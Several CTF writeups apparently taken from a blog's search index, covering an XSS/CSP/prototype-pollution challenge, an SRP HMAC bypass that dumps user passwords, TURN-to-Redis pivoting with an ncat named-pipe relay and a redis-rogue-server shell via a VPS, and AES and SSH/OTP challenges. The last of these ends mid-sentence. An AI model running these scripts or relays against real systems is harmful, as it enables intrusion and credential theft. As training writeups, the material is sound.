[{"categories":["ctf-writeups"],"content":"Writeup for Hackini 10th 2022, challenge name: Challenge Creator","date":"2022-06-02","objectID":"/hackini-10th-challenge-creator/","tags":["web","xss","csp","prototype-pollution"],"title":"Hackini 10th 2022 Challenge Creator","uri":"/hackini-10th-challenge-creator/"},{"categories":["ctf-writeups"],"content":"@chenx3en created a fun XSS challenge in HackINI 2022 ctf. ","date":"2022-06-02","objectID":"/hackini-10th-challenge-creator/:0:0","tags":["web","xss","csp","prototype-pollution"],"title":"Hackini 10th 2022 Challenge Creator","uri":"/hackini-10th-challenge-creator/"},{"categories":["ctf-writeups"],"content":"TL; DR HTML injection in the title tag. CSP injection. Prototype pollution and XSS ","date":"2022-06-02","objectID":"/hackini-10th-challenge-creator/:0:1","tags":["web","xss","csp","prototype-pollution"],"title":"Hackini 10th 2022 Challenge Creator","uri":"/hackini-10th-challenge-creator/"},{"categories":["ctf-writeups"],"content":"Overview When we visit the website link, we will be presented with a form to create a ctf challenge and share it with the admin (bot): After completing and submitting the form, we see a query parameter named challenge that has a JSON string including all of the supplied data. We also observe that the name of the challenge appears in the page title (\u003ctitle\u003e \u003c/title\u003e) . The page’s source code looks like this; I eliminated certain pieces since they are unnecessary and too long: \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e ... \u003ctitle\u003eChallenge: 'asd'\u003c/title\u003e ... \u003c/head\u003e \u003cbody class=\"bg-gray-50\"\u003e ... \u003c!-- TODO: Remove this script --\u003e \u003cscript nonce=\"U+pF6b1OcmbT1Ld832gOdg==\"\u003e let challenge, jsonCodeOutput; challenge = JSON.parse( new URL(window.location.href).searchParams.get(\"challenge\") ); console.log(\"challenge:\", challenge); jsonCodeOutput = {}; \u003c/script\u003e \u003cscript nonce=\"U+pF6b1OcmbT1Ld832gOdg==\"\u003e challenge = { name: \"Name\", category: \"web\", value: 100, meta: { version: \"0.1\", }, }; jsonCodeOutput = { tag: \"code\", attributes: { class: \"block overflow-x-scroll rounded language-json\", }, id: \"json-code-output\", }; console.log(\"default challenge:\", challenge); \u003c/script\u003e \u003cscript nonce=\"U+pF6b1OcmbT1Ld832gOdg==\"\u003e const sitekey = \"6LcxsckfAAAAAIngUXzlw931eegdBWErvFBPZ_K4\"; function outputChallenge(chal) { const jsonOutput = document.getElementById(\"json-output\"); const shareChallenge = document.getElementById(\"share-challenge\"); const containerOutput = document.getElementById(\"container-output\"); const value = JSON.stringify(chal, undefined, 2); const el = document.createElement(jsonCodeOutput.tag); el.textContent = value; el.id = jsonCodeOutput.id; for (const [attribute, val] of Object.entries( jsonCodeOutput.attributes )) { el.setAttribute(attribute, val); } hljs.highlightElement(el); jsonOutput.appendChild(el); shareChallenge.value = value; containerOutput.classList.remove(\"hidden\"); } function parseChallenge() { let assignedVal, value, parsedChal = {}, chal = null; try { chal = JSON.parse( new URL(window.location.href).searchParams.get(\"challenge\") ) || null; } catch (err) { console.error(\"Error:\", err); } if (chal === null) { const containerOutput = document.getElementById(\"container-output\"); const jsonOutput = document.getElementById(\"json-output\"); containerOutput.classList.add(\"hidden\"); jsonOutput.innerHTML = \"\"; return; } for (const [key, defaultValue] of Object.entries(challenge)) { value = chal[key]; console.log(\"key:\", key); console.log(\"defaultValue:\", defaultValue); console.log(\"value:\", value); if (typeof defaultValue === \"number\") { value = parseInt(value); } assignedVal = value || defaultValue; if ( typeof assignedVal === \"object\" \u0026\u0026 typeof defaultValue === \"object\" ) { if (parsedChal[key] === undefined) { parsedChal[key] = {}; } for (const [subKey, subDefaultValue] of Object.entries( defaultValue )) { let subValue = chal[key] !== undefined ? chal[key][subKey] : subDefaultValue; console.log(\"subkey:\", subKey); console.log(\"subDefaultValue:\", subDefaultValue); console.log(\"subValue:\", subValue); parsedChal[key][subKey] = subValue; } } else { parsedChal[key] = assignedVal; } } console.log(\"parsedChal:\", parsedChal); outputChallenge(parsedChal); } function submitChallenge(event) { event.preventDefault(); const formData = new FormData(this); const query = \"challenge=\" + encodeURIComponent(JSON.stringify(Object.fromEntries(formData))); window.location.href = `${window.location.origin}/?${query}`; } function loadCaptcha() { grecaptcha.render(\"captcha-div\", { sitekey: sitekey, }); } function updateHeight(el) { el.style.height = \"\"; el.style.height = el.scrollHeight + 3 + \"px\"; } window.onload = () =\u003e { const challengeForm = document.getElementById(\"challenge-form\"); const shareChallenge = document.getElementById(\"share-challenge\"); challengeForm.onsubmit = submitChallenge; parseChallenge(); updateHeight(shareChallenge); shareChallenge.oninput = (event) =\u003e { updateHeight(shareChallenge); }; loadCaptcha(); }; \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Here ","date":"2022-06-02","objectID":"/hackini-10th-challenge-creator/:0:2","tags":["web","xss","csp","prototype-pollution"],"title":"Hackini 10th 2022 Challenge Creator","uri":"/hackini-10th-challenge-creator/"},{"categories":["ctf-writeups"],"content":"In-Depth Analysis and Bugs Exploit My teammate @Fa2y and I first noticed the prototype pollution and potential exploit by glancing at the source code, but it was unexploitable on the second look because we didn’t have control over the key and subkey since they were coming from the default challenge object, and then we remembered the first code block where the challenge object was initialized with our supplied input but then overwritten by the second code block. \u003c!-- First code block --\u003e \u003cscript nonce=\"UQW0jCkPro5PVkUIQytbnQ==\"\u003e let challenge, jsonCodeOutput; challenge = JSON.parse( new URL(window.location.href).searchParams.get(\"challenge\") ); console.log(\"challenge:\", challenge); jsonCodeOutput = {}; \u003c/script\u003e \u003c!-- Second code block --\u003e \u003cscript nonce=\"UQW0jCkPro5PVkUIQytbnQ==\"\u003e challenge = { name: \"Name\", category: \"web\", value: 100, meta: { version: \"0.1\", }, }; jsonCodeOutput = { tag: \"code\", attributes: { class: \"block overflow-x-scroll rounded language-json\", }, id: \"json-code-output\", }; console.log(\"default challenge:\", challenge); \u003c/script\u003e Our theory at the time was that if the second block could be somehow “skipped”, we’d have complete control over the key and subkeywhich in returns allows us to pollute the prototype. But how are we going to achieve it? Is there a way to have the browser reject the second script? I paused for a moment and recalled the injection in the page title, which allows us to inject new CSP policy in the tag to prevent the execution of the second script. An example here: \u003c/title\u003e\u003cmeta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self' 'unsafe-eval' 'strict-dynamic'\"\u003e\u003ctitle\u003e By injecting this payload, we notice various CSP-related errors in the browser console, indicating that our policy was properly processed: As the errors above indicate, we can enable script execution if we supply a valid nonce (which is neither controlled nor guessable) or generate hashes for the whitelist scripts (solution for this scenario). In this situation, we will use the hashes computed by Chrome (alternatively, there are online websites that can calculate script hashes, such as csplite As a result, our final CSP rule will look like this: \u003cmeta http-equiv=\"Content-Security-Policy\" content=\"script-src * 'sha256-eyVKju/vSji+klXiXwhgD7spFJI0/Kk10K2eq4a9NCU=' 'sha256-8+tX0RdD8rNbWDDLNb3z8ixoi28g7G5On2AwCBePR0Y=' \" /\u003e script-src * : allow all sources for JavaScript (we will use it later to load our script). 'sha256-eyVKju/vSji+klXiXwhgD7spFJI0/Kk10K2eq4a9NCU=' : allow the first script where we can controll challengeobject . 'sha256-8+tX0RdD8rNbWDDLNb3z8ixoi28g7G5On2AwCBePR0Y=': allow the third script where the prototype pollution occur. And we were able to block the execution of the second script: Now that we have successfully controlled the key and subkey and the possiblilty to exploit the prototype pollution, we must seek for anything worthwhile to pollute in the prototype. Returning to the source code, in the outputChallenge function, where an html element is created based on the jsonCodeOutput object properties. function outputChallenge(chal) { const jsonOutput = document.getElementById(\"json-output\"); const shareChallenge = document.getElementById(\"share-challenge\"); const containerOutput = document.getElementById(\"container-output\"); const value = JSON.stringify(chal, undefined, 2); const el = document.createElement(jsonCodeOutput.tag); el.textContent = value; el.id = jsonCodeOutput.id; for (const [attribute, val] of Object.entries(jsonCodeOutput.attributes)) { el.setAttribute(attribute, val); } hljs.highlightElement(el); jsonOutput.appendChild(el); shareChallenge.value = value; containerOutput.classList.remove(\"hidden\"); } We may modify the jsonCodeOutput object properties using the prototype pollution vulnerability to inject our script and achieve js code execution. For more details see : Hacktricks prototype pollution The final payload: { \"name\": \"\u003c/title\u003e \u003cmeta http-equiv='Content-Security-Policy' co","date":"2022-06-02","objectID":"/hackini-10th-challenge-creator/:0:3","tags":["web","xss","csp","prototype-pollution"],"title":"Hackini 10th 2022 Challenge Creator","uri":"/hackini-10th-challenge-creator/"},{"categories":["ctf-writeups"],"content":"References https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution ","date":"2022-06-02","objectID":"/hackini-10th-challenge-creator/:0:4","tags":["web","xss","csp","prototype-pollution"],"title":"Hackini 10th 2022 Challenge Creator","uri":"/hackini-10th-challenge-creator/"},{"categories":["ctf-writeups"],"content":"Writeup for CSAW CTF 2020, challenge name: Web RTC","date":"2020-09-15","objectID":"/csawquals20-smallsurp/","tags":["crypto","shamir","shamir-secret-scheme","math","number-theory","csawquals20"],"title":"Csawquals20 Smallsurp","uri":"/csawquals20-smallsurp/"},{"categories":["ctf-writeups"],"content":"Writeup summary Challenge Info TL-DR Analysis of the server code Bypass Hmac Verification Assemble Secrets and Get Flag ","date":"2020-09-15","objectID":"/csawquals20-smallsurp/:1:0","tags":["crypto","shamir","shamir-secret-scheme","math","number-theory","csawquals20"],"title":"Csawquals20 Smallsurp","uri":"/csawquals20-smallsurp/"},{"categories":["ctf-writeups"],"content":"Challenge Info Your APT group scr1pt_k1tt13z breached into a popular enterprise service, but due to inexperience, you only got the usernames of the administrators of the service, and an encrypted password for the root admin. However, you learned that the company had a key agreement ceremony at some point in time, and the administrators keys are all somehow connected to the root admin’s. http://crypto.chal.csaw.io:5005/ Attachment: server_handout.py #!/usr/bin/env python3 import os import base64 import hashlib import random import flask from gen_db import DATABASE app = flask.Flask(__name__) app.secret_key = \"dljsaklqk24e21cjn!Ew@@dsa5\" N = int(\"00ab76f585834c3c2b7b7b2c8a04c66571539fa660d39762e338cd8160589f08e3d223744cb7894ea6b424ebab899983ff61136c8315d9d03aef12bd7c0486184945998ff80c8d3d59dcb0196fb2c37c43d9cbff751a0745b9d796bcc155cfd186a3bb4ff6c43be833ff1322693d8f76418a48a51f43d598d78a642072e9fff533\", 16) g = 2 k = 3 b = random.randint(0, N - 1) salt = str(random.randint(0, 2**32 - 1)) def gen_seed(): return random.randint(0, N - 1) def xor_data(binary_data_1, binary_data_2): return bytes([b1 ^ b2 for b1, b2 in zip(binary_data_1, binary_data_2)]) def modular_pow(base, exponent, modulus): if modulus == -1: return 0 result = 1 base %= modulus while exponent \u003e 0: if exponent % 2: result = (result * base) % modulus exponent \u003e\u003e= 1 base = (base * base) % modulus return result def hmac_sha256(key, message): if len(key) \u003e 64: key = sha256(key).digest() if len(key) \u003c 64: key += b'\\x00' * (64 - len(key)) o_key_pad = xor_data(b'\\x5c' * 64, key) i_key_pad = xor_data(b'\\x36' * 64, key) return hashlib.sha256(o_key_pad + hashlib.sha256(i_key_pad + message).digest()).hexdigest() def hasher(data): return int(hashlib.sha256(data.encode()).hexdigest(), 16) app.jinja_env.globals.update( gen_seed=gen_seed, modular_pow=modular_pow, N=N, ) @app.route(\"/\", methods=[\"GET\", \"POST\"]) def home(): if flask.request.method == \"POST\": username = flask.request.form.get(\"username\") if username is None: flask.flash(\"Error encountered on server-side.\") return flask.redirect(flask.url_for(\"home\")) hmac = flask.request.form.get(\"computed\") if (hmac is not None): return flask.redirect(flask.url_for(\"dashboard\", user=username, hmac=hmac)) try: pwd = DATABASE[username] except KeyError: flask.flash(\"Cannot find password for username in database\") return flask.redirect(flask.url_for(\"home\")) try: A = int(flask.request.form.get(\"token1\")) except Exception as e: flask.flash(\"Error encountered on server-side\") return flask.redirect(flask.url_for(\"home\")) if A is None: flask.flash(\"Error encountered on server-side.\") return flask.redirect(flask.url_for(\"home\")) if A in [0, N]: flask.flash(\"Error encountered on server-side. \u003e:)\") return flask.redirect(flask.url_for(\"home\")) xH = hasher(salt + str(pwd)) v = modular_pow(g, xH, N) B = (k * v + modular_pow(g, b, N)) % N u = hasher(str(A) + str(B)) S = modular_pow(A * modular_pow(v, u, N), b, N) K = hashlib.sha256(str(S).encode()).digest() flask.session[\"server_hmac\"] = hmac_sha256(K, salt.encode()) return flask.jsonify(nacl=salt, token2=B) else: return flask.render_template(\"home.html\") @app.route(\"/dash/\u003cuser\u003e\", methods=[\"POST\", \"GET\"]) def dashboard(user): if \"hmac\" not in flask.request.args: flask.flash(\"Error encountered on server-side.\") return flask.redirect(flask.url_for(\"home\")) hmac = flask.request.args[\"hmac\"] servermac = flask.session.get(\"server_hmac\", None) print(hmac, servermac) if hmac != servermac: flask.flash(\"Incorrect password.\") return flask.redirect(flask.url_for(\"home\")) pwd = DATABASE[user] return flask.render_template(\"dashboard.html\", username=user, pwd=pwd) if __name__ == \"__main__\": app.run() database.txt Jere: Lakisha: Loraine: Ingrid: Orlando: Berry: Alton: Bryan: Kathryn: Brigitte: Dannie: Jo: Leslie: Adrian: Autumn: Kellie: Alphonso: Joel: Alissa: Rubin: encrypted.txt cbc:254dc5ae7bb063ceaf3c2da953386948:08589c6b40ab64c434064ec4be41c9089eefc599603bc7441898c2e8511d03f6 ","date":"2020-09-15","objectID":"/csawquals20-smallsurp/:2:0","tags":["crypto","shamir","shamir-secret-scheme","math","number-theory","csawquals20"],"title":"Csawquals20 Smallsurp","uri":"/csawquals20-smallsurp/"},{"categories":["ctf-writeups"],"content":"TL-DR we have a webiste http://crypto.chal.csaw.io:5005/ containing a login form where the server authenthicate users and add the hmac to the session, there is a /home where server verify the hmac and show the user password so as an attacker we have to get all users password and then assemble them with SHAMIR SECRET SHARING SCHEMA to decrypt the flag. ","date":"2020-09-15","objectID":"/csawquals20-smallsurp/:3:0","tags":["crypto","shamir","shamir-secret-scheme","math","number-theory","csawquals20"],"title":"Csawquals20 Smallsurp","uri":"/csawquals20-smallsurp/"},{"categories":["ctf-writeups"],"content":"Analysis of the server code by checking the server code we can say that it is a flask application that has 2 routes: / : handle POST request where we can submit the username and password the essential POST parametre are {token1, username } when we check the source code of the webpage we can see that token1 is an int value constant that is passed when user log in, then it is making some validation on the value of token1 : try: A = int(flask.request.form.get(\"token1\")) except Exception as e: flask.flash(\"Error encountered on server-side\") return flask.redirect(flask.url_for(\"home\")) if A is None: flask.flash(\"Error encountered on server-side.\") return flask.redirect(flask.url_for(\"home\")) if A in [0, N]: flask.flash(\"Error encountered on server-side. \u003e:)\") return flask.redirect(flask.url_for(\"home\")) we can notice one thing that is strange if A in [0, N]: which mean that A can be any value except 0 and N, then server calculate the hmac based on the value of A and password then save it in the session: xH = hasher(salt + str(pwd)) v = modular_pow(g, xH, N) B = (k * v + modular_pow(g, b, N)) % N u = hasher(str(A) + str(B)) S = modular_pow(A * modular_pow(v, u, N), b, N) K = hashlib.sha256(str(S).encode()).digest() flask.session[\"server_hmac\"] = hmac_sha256(K, salt.encode()) and then return the salt used in the calculation of hmac and return B /dash/\u003cuser\u003e: it check the hmac we send with the hmac saved in the session if its the same it will redirect to dashboard.html which will show us the password ","date":"2020-09-15","objectID":"/csawquals20-smallsurp/:4:0","tags":["crypto","shamir","shamir-secret-scheme","math","number-theory","csawquals20"],"title":"Csawquals20 Smallsurp","uri":"/csawquals20-smallsurp/"},{"categories":["ctf-writeups"],"content":"Bypass Hmac Verification To bypass the hmac verfication we have to get back to how the hmac is calculated and get back on what we have noticed back then. So what we can controll is the username and the value of A. By looking more deeper in the calculation of the hmac we can notice it is calculation S = modular_pow(A * modular_pow(v, u, N), b, N) and this value will be used in sha2 hash to get the hmac so if we can know the value of S we can calculate the hmac locally and bypass it. but how can we get the value of S. In the first part we noticed A is validated in a strange way if A in [0, N]: this is to make sure S !=0 but we can send A=2*N which will make S=0 and the salt is sent to us we can calculate the hmac locally !!! .let’s scipt it : BASE_URL = 'http://crypto.chal.csaw.io:5005/' for user in users: s = requests.Session() data = { \"username\": user, \"token1\": 2*N, } response = s.post(BASE_URL, data=data) y = json.loads(response.content.decode()) salt = y[\"nacl\"] S = 0 K = hashlib.sha256(str(S).encode()).digest() hmac = hmac_sha256(K, salt.encode()) data = { \"computed\": hmac, \"username\": user, } response = s.post(BASE_URL, data=data) content = response.content.decode() hash = re.findall(r'\u003ctd\u003e(.*)\u003c/td\u003e', content)[1] print(hash) with this script we can get a list of hashes of each user . ","date":"2020-09-15","objectID":"/csawquals20-smallsurp/:5:0","tags":["crypto","shamir","shamir-secret-scheme","math","number-theory","csawquals20"],"title":"Csawquals20 Smallsurp","uri":"/csawquals20-smallsurp/"},{"categories":["ctf-writeups"],"content":"Assemble Secrets and Get Flag Now that we have all the passwords we can see a pattern in the passwords for example here is the first one 1:c4ee528d1e7d1931e512ff263297e25c:128 and in the description they said that the passwords are connected to the root password( the flag ), so we need a way to assemble those passwords, after wasting a lot of time testing out different methods i finnaly found the correct one which is using the SHAMIR SECRET SCHEME And was able to decrypt and get the flag flag{n0t_s0_s3cur3_4ft3r_4ll} here is what i did to decrypt it : from Crypto.Protocol.SecretSharing import Shamir from Crypto.Cipher import AES from binascii import unhexlify shares = [] for idx, hash in enumerate(hashes): print(idx) shares.append((idx+1, int(hash, 16))) key = Shamir.combine(shares) print(key) IV = unhexlify('254dc5ae7bb063ceaf3c2da953386948') cipher = AES.new(key, AES.MODE_CBC, IV) c = unhexlify( '08589c6b40ab64c434064ec4be41c9089eefc599603bc7441898c2e8511d03f6') print(cipher.decrypt(c)) ","date":"2020-09-15","objectID":"/csawquals20-smallsurp/:6:0","tags":["crypto","shamir","shamir-secret-scheme","math","number-theory","csawquals20"],"title":"Csawquals20 Smallsurp","uri":"/csawquals20-smallsurp/"},{"categories":["ctf-writeups"],"content":"Writeup for CSAW CTF 2020, challenge name: Web RTC","date":"2020-09-14","objectID":"/csawquals20-webrtc/","tags":["turn","redis","rce","csawquals20","web"],"title":"CsawQuals2020 WebRTC ","uri":"/csawquals20-webrtc/"},{"categories":["ctf-writeups"],"content":"WEB real time chat Challenge Info ","date":"2020-09-14","objectID":"/csawquals20-webrtc/:0:0","tags":["turn","redis","rce","csawquals20","web"],"title":"CsawQuals2020 WebRTC ","uri":"/csawquals20-webrtc/"},{"categories":["ctf-writeups"],"content":"Writeup Summary Challenge description Enumeration ","date":"2020-09-14","objectID":"/csawquals20-webrtc/:1:0","tags":["turn","redis","rce","csawquals20","web"],"title":"CsawQuals2020 WebRTC ","uri":"/csawquals20-webrtc/"},{"categories":["ctf-writeups"],"content":"Challenge description I started playing around with some fancy new Web 3.1 technologies! This RTC tech looks cool, but there's a lot of setup to get it working... I hope it's all secure. http://web.chal.csaw.io:4955 they also included some files: Dockerfile , supervisord.conf and app.py. supervisord.conf: [supervisord] nodaemon=true [program:gunicorn3] command=gunicorn3 --workers=10 -b 0.0.0.0:5000 app:app autorestart=true user=www [program:coturn] command=turnserver autorestart=true user=www [program:redis] command=timeout 60s redis-server --bind 0.0.0.0 autorestart=true user=www Dockerfile: FROM ubuntu:18.04 RUN adduser --disabled-password --gecos '' www RUN apt-get update \u0026\u0026 apt-get install -y coturn redis python3 python3-pip gunicorn3 supervisor WORKDIR app COPY requirements.txt . RUN pip3 install -r requirements.txt COPY flag.txt / RUN chmod 444 /flag.txt COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf RUN echo 'min-port=49000' \u003e\u003e /etc/turnserver.conf RUN echo 'max-port=49100' \u003e\u003e /etc/turnserver.conf COPY app.py . COPY static static EXPOSE 3478 EXPOSE 5000 CMD [\"supervisord\"] ","date":"2020-09-14","objectID":"/csawquals20-webrtc/:1:1","tags":["turn","redis","rce","csawquals20","web"],"title":"CsawQuals2020 WebRTC ","uri":"/csawquals20-webrtc/"},{"categories":["ctf-writeups"],"content":"Enumeration At first, we took a look at those files, which show up that there are 3 servers running, a Redis server (not exposed to external), gunicorn (flask web app server), and turn ( for webrtc ). then we took a look at the web app, basically the frontend and what does it do, Frontend we found that it’s sending requests to the flask app (the API) (OBVIOUSLY), and the file rtc.js is the source of this request, we checked it out, and after reading the some code we found the turn communication config, the turn host web.chal.csaw.io:3478, the username and password (empty): const iceConfiguration = { iceServers: [ { urls: \"turn:web.chal.csaw.io:3478\", username: \"\", credential: \"\", }, ], // Doesn't work to force relay only transport, something must be busted... //iceTransportPolicy: \"relay\" }; We were new to webRTC, so we started googling and trying to learn about it, and about the turn server and the attacks vectors we can apply on it, we tried also to find a vulnerabilities in the web API but we get nothing, then we found a really interesting article https://www.rtcsec.com/2020/04/01-slack-webrtc-turn-compromise/#a-very-brief-introduction-to-the-turn-protocol talking about how to abuse a turn server and get access to internal services like Redis in our case, a really nice article and attack they are using, it suits our case very well, but there is a problem, they are using an internal tool called stunner that we couldn’t find, so we just start searching for alternatives, we found a PoC for the same attack called turner: https://github.com/staaldraad/turner by staaldraad, after we found this we tried very hard to make it working even with the a lot struggles (the internet connection in our country was so bad :/ ) even tho we make it, we started testing if it’s working, run turner with turner config we found earlier: ./turner -server web.chal.csaw.io:3478 -u '' -p '' send a request to our vps: curl -x http://localhost:8080 http://x.x.x.x this worked so well, so we used the browser also to load the app http://0.0.0.0:5000 using the proxy and worked just fine. now we are sure the proxy is working but how we can connect to Redis?! we found that we can use an HTTP proxy with ncat, so we crafted really nice chaining: rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|ncat -lkp 1337 2\u003e\u00261 |ncat --proxy-type http --proxy localhost:8080 0.0.0.0 6379 \u003e /tmp/f this is basically connect to redis service on host: 0.0.0.0, port :6379 using proxy http://localhost:8080 and forward it that to the port: 1337 we tested the connection using simple command Redis command INFO: {printf \"INFO\\r\\n\"; sleep 1} | nc localhost 1337 -vvv worked perfectly!!! we also tried to connect using redis-cli but it didn’t work, it started sending some random data, so we settled on the raw commands sending! In this step we had to get rce or read a file (flag), we had two options, crafting rce by ourself using raw Redis commands (our last option :3) or use tools, the redis-cli didn’t work so we couldn’t use the regular Redis attack using the config command, we found many tools, that uses the master-slave attack we tried some but I’m gonna mention only the tool that worked for us: https://github.com/n0b0dyCN/redis-rogue-server Making this tool working was an adventure, as I mentioned before we had an internet problem in our country :/ and the ssh wasn’t even working to get into our VPS, So here is how it has been done: we used digitalocean web console to set up the Redis redis-rogue-server. we had already turner connected and also the ncat connect to Redis as I mentioned before. the last step was to connect the Redis service from our local port 1337 to redis-rogue-server in our VPS, we used ngrok. ./redis-rogue-server.py --rhost [ngrok url] --rport [ngrok port] --lhost [vps public ip] then choose the Interactive shell: cat /flag.txt flag{ar3nt_u_STUNned_any_t3ch_w0rks_@_all?} Flag in this challenge, we learned a lot, it’s a good challenge that we really loved, big thanks to CSAW CTF ","date":"2020-09-14","objectID":"/csawquals20-webrtc/:1:2","tags":["turn","redis","rce","csawquals20","web"],"title":"CsawQuals2020 WebRTC ","uri":"/csawquals20-webrtc/"},{"categories":["ctf-writeups"],"content":"Writeup for Pwn2Win CTF 2020, challenge name: Androids_Encryption","date":"2020-08-09","objectID":"/pwn2win2020-androids-encryption/","tags":["symmetric-crypto","aes","pwn2win-ctf","crypto"],"title":"Pwn2win2020 Androids Encryption","uri":"/pwn2win2020-androids-encryption/"},{"categories":["ctf-writeups"],"content":"Challenge Info ​ The challenge is a crypto challenge from the pwn2win event , it’s focused on the symmetric cryptography and especially the aes block cipher.So we are given remote connection nc encryption.pwn2.win 1337 and the python script that is running in the remote server.py . ","date":"2020-08-09","objectID":"/pwn2win2020-androids-encryption/:0:1","tags":["symmetric-crypto","aes","pwn2win-ctf","crypto"],"title":"Pwn2win2020 Androids Encryption","uri":"/pwn2win2020-androids-encryption/"},{"categories":["ctf-writeups"],"content":"Writeup Summary gain general information deep look into encrypt your secret Solution ","date":"2020-08-09","objectID":"/pwn2win2020-androids-encryption/:0:2","tags":["symmetric-crypto","aes","pwn2win-ctf","crypto"],"title":"Pwn2win2020 Androids Encryption","uri":"/pwn2win2020-androids-encryption/"},{"categories":["ctf-writeups"],"content":"gain general information ​ By the first look at the server.py script we notice there are 3 main functions first one is def encrypt(txt, key, iv) where you pass the plaintext the key and iv this function will check that the plaintext length is multiple of Block Size which is 128 and then it will encrypt the plaintext with custom implementation of AES , the second one is enc_plaintextthis function that we will interact with it will take our plaintext and decode it as a base64 and pass it to encrypt with key1 and iv1 which are secrets . The last function is enc_flag() it will encrypt the flag with key2 and iv2 which their difinition is : iv2 = AES.new(key1, AES.MODE_ECB).decrypt(iv1) key2 = xor(to_blocks(flag)) by looking at the xor function we noticed that if two parametres a,b are passed then it will calculate a xor b else if one parametre a is passed it will return a[0] xor \\x00 *len(a[0]) so it will return the first block xored with 00 and that meen it will return the first block . ","date":"2020-08-09","objectID":"/pwn2win2020-androids-encryption/:0:3","tags":["symmetric-crypto","aes","pwn2win-ctf","crypto"],"title":"Pwn2win2020 Androids Encryption","uri":"/pwn2win2020-androids-encryption/"},{"categories":["ctf-writeups"],"content":"deep look into encrypt your secret ​ After looking in the function i noticed it doing 2 things interesting : first thing is that it is returning to us the iv passed in parametre + the cipher so for example if we passed iv2 to the function than we get as a result iv2+ cipher base64.b64encode(iv+ctxt) PS: of course all inputs and outputs are encoded with base64 the second interesting thing is that it is overriding the iv2 and key2 that are used in encrypting the flag : iv2 = AES.new(key2, AES.MODE_ECB).decrypt(iv2) key2 = xor(to_blocks(ctxt)) so the new iv2 is the decryption of the previous iv2 with key2 and the new key2 is the xor of the cipher calculated and as we have discussed xor function when we pass one parametre it will return the first block of the passed object so key2 = cipher[0] so from the result iv+ctx we can get iv1 and key2 from the cipher and to get the next value of iv2 we need the value of key2 before change .so the idea of the challenge is to try to guess the iv2 and key2 that will be used next time we encrypt the flag . ","date":"2020-08-09","objectID":"/pwn2win2020-androids-encryption/:0:4","tags":["symmetric-crypto","aes","pwn2win-ctf","crypto"],"title":"Pwn2win2020 Androids Encryption","uri":"/pwn2win2020-androids-encryption/"},{"categories":["ctf-writeups"],"content":"Solution ​ after trying in a paper the different combination of commandes that will allow us to get the key and initial vector i finnaly found the solution it is bit tricky so what we will do is : we will send a random payload with 16 bytes to the oracle that will return us iv1 + cipher and from the cipher we can get the new value key2 because as we said key2 = a[0] the new key is the first block of cipher next we will send the encrypt flag command that will return to us iv2 + flag_cipher and here we can use the result of the first step which is key2 and get the new value of iv2 because it will be changed by iv2 = AES.new(key2, AES.MODE_ECB).decrypt(iv2) and also we update the value of key2 now we have the key2 and iv2 values and we can use it to decipher the flag next time because this value will be used next time we will send the encrypt flag command and decrypt the cipher : aes = AES.new(key2, AES.MODE_ECB) curr = iv2 bs = len(key2) text=b\"\" for block in blocks: text +=xor(curr, aes.decrypt(block)) curr = xor(text[-bs:], block) print(text) the challenge used a modified version of aes ecb it work like this cipher1 = aes(text1 xor iv) then cipher2 = aes(text2 xor (text1 xor cipher1)) and it do this for each block . so for the decryption part we can do this text1 = iv xor aes.decrypt(cipher1) and for other blocks textI= (cipherJ xor textJ) xor aes.decrypt(cipherI) where J = I-1. and finnaly we got the flag CTF-BR{kn3W_7h4T_7hEr3_4r3_Pc8C_r3pe471ti0ns?!?} . awesome challenge had so much fun solving it . ​ ","date":"2020-08-09","objectID":"/pwn2win2020-androids-encryption/:0:5","tags":["symmetric-crypto","aes","pwn2win-ctf","crypto"],"title":"Pwn2win2020 Androids Encryption","uri":"/pwn2win2020-androids-encryption/"},{"categories":["ctf-writeups"],"content":"Writeup for Cybrics CTF 2020, challenge name: OTP","date":"2020-08-08","objectID":"/cybrics2020-otp/","tags":["linux","ctb","cybrics-ctf","ssh"],"title":"Cybrics2020 Otp","uri":"/cybrics2020-otp/"},{"categories":["ctf-writeups"],"content":"Challenge Info A crack the box challenge (hackthebox/vulnhub-like) http://otp-cybrics2020.ctf.su/ the web-page provides a input for auth token and a the client binary and the server’s, and the source code of the server. Main Page ","date":"2020-08-08","objectID":"/cybrics2020-otp/:1:0","tags":["linux","ctb","cybrics-ctf","ssh"],"title":"Cybrics2020 Otp","uri":"/cybrics2020-otp/"},{"categories":["ctf-writeups"],"content":"TL-DR We discover the client binary is using ssh, we get the private key out of the binary and get the user also we use ssh keys to do forward port tunneling of the mongodb port from the server to our machine we connect to the db and get the otp of the admin provide it to the website and we get the flag. ","date":"2020-08-08","objectID":"/cybrics2020-otp/:2:0","tags":["linux","ctb","cybrics-ctf","ssh"],"title":"Cybrics2020 Otp","uri":"/cybrics2020-otp/"},{"categories":["ctf-writeups"],"content":"Writeup Summary Understanding how the service works. Doing some blackbox analyses on the client binary. Port forwarding the mongodb port to our machine. Getting the otp from the mongodb and submitting it to get the flag. ","date":"2020-08-08","objectID":"/cybrics2020-otp/:3:0","tags":["linux","ctb","cybrics-ctf","ssh"],"title":"Cybrics2020 Otp","uri":"/cybrics2020-otp/"},{"categories":["ctf-writeups"],"content":"Initial Understanding The client binary can be used to login or register an account, the login mechanism do it’s magic and get u a token : ./client login -l user7 -p userpass7 Response: SUCCESS: ac003f82-edfc-4855-b761-bdc59406d8d4 The token can be submitted into the webpage but get nothing because we’re not admin: Cabinet Page that means the admin token is the target. The server binary we can understand it’s functionality from the source code, It’s expect 3 lines as input, first one is the action(login/register), the second is username, the third is password; It connects to a mongodb and create a user in case of register or verify the creds and create an otp in case of login. PS: the server’s code import mongodb configs (username,pass, host,port) from a .env file but still uses hardcoded creds, dbname and collection. ","date":"2020-08-08","objectID":"/cybrics2020-otp/:3:1","tags":["linux","ctb","cybrics-ctf","ssh"],"title":"Cybrics2020 Otp","uri":"/cybrics2020-otp/"},{"categories":["ctf-writeups"],"content":"Blackbox Analyses Both the client and the server were written in go, we first tried reverse engineering it but we all know how messy that can be, so we tried some black box analyses, First we analyzed the network using strace : strace -f -e trace=network ./client login -l user7 -p userpass7 Strace We see the client app resolves the domain otp-cybrics2020.ctf.su and gets it’s ip address 34.76.112.206 but we can’t get how the data is sent, so we decide to capture the network 